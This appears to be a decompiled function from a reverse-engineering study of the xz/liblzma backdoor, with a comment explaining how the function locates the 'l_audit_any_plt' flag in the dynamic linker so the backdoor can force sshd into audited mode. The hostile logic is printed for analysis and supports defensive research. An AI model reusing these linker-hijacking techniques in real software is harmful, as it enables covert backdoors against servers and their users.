// /home/kali/xzre-ghidra/xzregh/104AE0_find_link_map_l_audit_any_plt_bitmask.c
// Function: find_link_map_l_audit_any_plt_bitmask @ 0x104AE0
// Calling convention: unknown
// Prototype: undefined find_link_map_l_audit_any_plt_bitmask(void)


/*
 * AutoDoc: Scans `_dl_audit_symbind_alt` for the MOV/TEST sequence that inspects `link_map::l_audit_any_plt`.
 * It tracks which register held the computed displacement, validates that the test uses a single
 * set bit, and saves both the target address (relative to the libname offset) and the mask. Those
 * values are later used to toggle sshd/libcrypto into "audited" mode when the custom audit
 * interface is installed.
 */
#include "xzre_types.h"


undefined8 find_link_map_l_audit_any_plt_bitmask(undefined8 *param_1,ulong *param_2)

{
  int *piVar1;
  byte bVar2;
  int iVar3;
  int iVar4;
  long lVar5;
  long lVar6;
  byte *pbVar7;
  byte bVar8;
  byte bVar9;
  long lVar10;
  ulong uVar11;
  long *plVar12;
  ulong uVar13;
  byte bVar14;
  long local_80;
  long local_78;
  undefined4 local_70;
  byte local_65;
  undefined4 local_64;
  byte local_60;
  uint local_58;
  ulong local_50;
  ulong local_40;
  
  bVar14 = 0;
  iVar3 = secret_data_append_from_address(0,0x97,0x1f,9);
  if (iVar3 != 0) {
    uVar13 = *param_2;
    plVar12 = &local_80;
    for (lVar10 = 0x16; lVar10 != 0; lVar10 = lVar10 + -1) {
      *(undefined4 *)plVar12 = 0;
      plVar12 = (long *)((long)plVar12 + (ulong)bVar14 * -8 + 4);
    }
    lVar10 = get_lzma_allocator(1);
    *(undefined8 *)(lVar10 + 0x10) = *(undefined8 *)(param_1[1] + 0x20);
    lVar5 = lzma_alloc(0xc08,lVar10);
    uVar11 = param_2[7];
    *(long *)(uVar11 + 0xa8) = lVar5;
    if (lVar5 != 0) {
      *(int *)(uVar11 + 0x120) = *(int *)(uVar11 + 0x120) + 1;
    }
    piVar1 = *(int **)(uVar11 + 0x118);
    lVar5 = get_lzma_allocator(1);
    *(undefined8 *)(lVar5 + 0x10) = *(undefined8 *)(param_1[1] + 0x10);
    lVar6 = lzma_alloc(0x348);
    *(long *)(piVar1 + 4) = lVar6;
    if (lVar6 != 0) {
      *piVar1 = *piVar1 + 1;
    }
    iVar3 = 0;
    bVar14 = 0xff;
    for (; uVar13 < param_2[1]; uVar13 = uVar13 + local_78) {
      iVar4 = x86_dasm(&local_80,uVar13);
      if (iVar4 == 0) {
        return 0;
      }
      if (iVar3 == 0) {
        if (((local_58 == 0x1036) && (((ushort)local_70 & 0x140) == 0x140)) &&
           ((byte)(local_64._1_1_ - 1U) < 2)) {
          bVar8 = 0;
          if ((local_70 & 0x40) == 0) {
            bVar2 = 0;
            if (((local_70 & 0x1040) != 0) &&
               (bVar2 = local_70._1_1_ & 0x10, (local_70 & 0x1000) != 0)) {
              if ((local_70 & 0x20) == 0) {
                bVar8 = 0;
                bVar2 = local_60;
              }
              else {
                bVar2 = local_60 | (local_65 & 1) << 3;
              }
            }
          }
          else {
            bVar2 = (byte)local_70 & 0x20;
            if ((local_70 & 0x20) == 0) {
              bVar8 = local_64._3_1_;
              if ((local_70 & 0x1040) != 0) {
                bVar2 = local_64._2_1_;
              }
            }
            else {
              bVar8 = local_64._3_1_ | local_65 * '\b' & 8;
              bVar2 = 0;
              if ((local_70 & 0x1040) != 0) {
                bVar2 = local_64._2_1_ | local_65 * '\x02' & 8;
              }
            }
          }
          uVar11 = 0;
          if (((local_70 & 0x100) != 0) && (uVar11 = local_50, (local_64 & 0xff00ff00) == 0x5000000)
             ) {
            uVar11 = local_50 + local_80 + local_78;
          }
          if (((uint)param_2[2] == uVar11) &&
             (((int)(uint)*(ushort *)param_2[4] >> (bVar8 & 0x1f) & 1U) != 0)) {
            *(byte *)((ushort *)param_2[4] + 1) = bVar2;
            iVar3 = 1;
          }
        }
      }
      else if (iVar3 == 1) {
        if ((local_58 & 0xfffffffd) == 0x89) {
          uVar11 = param_2[3];
          bVar8 = (byte)local_70 & 0x40;
          if ((local_70 & 0x1040) == 0) {
            bVar2 = 0;
            if ((local_70 & 0x40) != 0) goto LAB_00104d83;
            if (*(char *)(uVar11 + 2) != '\0') goto LAB_00104e97;
            bVar9 = 0;
LAB_00104da0:
            if (*(byte *)(param_2[4] + 2) != bVar8) goto LAB_00104da9;
          }
          else {
            if ((local_70 & 0x40) == 0) {
              if ((local_70 & 0x1000) == 0) {
                if (*(char *)(uVar11 + 2) == '\0') {
                  bVar2 = 0;
                  bVar9 = 0;
                  goto LAB_00104da0;
                }
                goto LAB_00104e97;
              }
              bVar2 = local_60;
              if ((local_70 & 0x20) != 0) {
                bVar2 = local_60 | (local_65 & 1) << 3;
              }
            }
            else {
              bVar2 = local_64._2_1_;
              if ((local_70 & 0x20) != 0) {
                bVar2 = local_64._2_1_ | local_65 * '\x02' & 8;
              }
LAB_00104d83:
              bVar8 = local_64._3_1_;
              if ((local_70 & 0x20) != 0) {
                bVar8 = local_64._3_1_ | (local_65 & 1) << 3;
              }
            }
            bVar9 = *(byte *)(uVar11 + 2);
            if (bVar9 == bVar2) goto LAB_00104da0;
LAB_00104da9:
            if ((bVar8 != bVar9) || (*(byte *)(param_2[4] + 2) != bVar2)) goto LAB_00104e97;
          }
          iVar3 = 2;
          bVar14 = bVar8;
          if (local_58 != 0x89) {
            bVar14 = bVar2;
          }
        }
      }
      else if (iVar3 == 2) {
        if (local_58 == 0x128) {
          bVar8 = 0;
        }
        else {
          if ((local_58 != 0x176) || (local_64._2_1_ != 0)) goto LAB_00104e97;
          bVar8 = 0;
          if ((local_70 & 0x1040) != 0) {
            if ((local_70 & 0x40) == 0) {
              bVar8 = local_70._1_1_ & 0x10;
              if (((local_70 & 0x1000) != 0) && (bVar8 = local_60, (local_70 & 0x20) != 0)) {
                bVar8 = local_60 | (local_65 & 1) << 3;
              }
            }
            else {
              bVar8 = (byte)local_70 & 0x20;
              if ((local_70 & 0x20) != 0) {
                bVar8 = local_65 * '\x02' & 8;
              }
            }
          }
        }
        if (bVar14 == bVar8) {
          if ((local_40 < 0x100) && (iVar3 = count_bits(), iVar3 == 1)) {
            uVar13 = param_2[6];
            pbVar7 = (byte *)((ulong)(uint)param_2[2] + *(long *)*param_1);
            *(byte **)(uVar13 + 0x60) = pbVar7;
            *(char *)(uVar13 + 0x68) = (char)local_40;
            if ((*pbVar7 & local_40) == 0) {
              return 1;
            }
          }
          *(undefined4 *)(param_2 + 5) = 1;
          return 0;
        }
      }
LAB_00104e97:
    }
    *(undefined8 *)(lVar10 + 0x10) = *(undefined8 *)(param_1[1] + 0x20);
    lzma_free(*(undefined8 *)(param_2[7] + 0xa8),lVar10);
    lzma_free(*(undefined8 *)(piVar1 + 4),lVar5);
  }
  return 0;
}

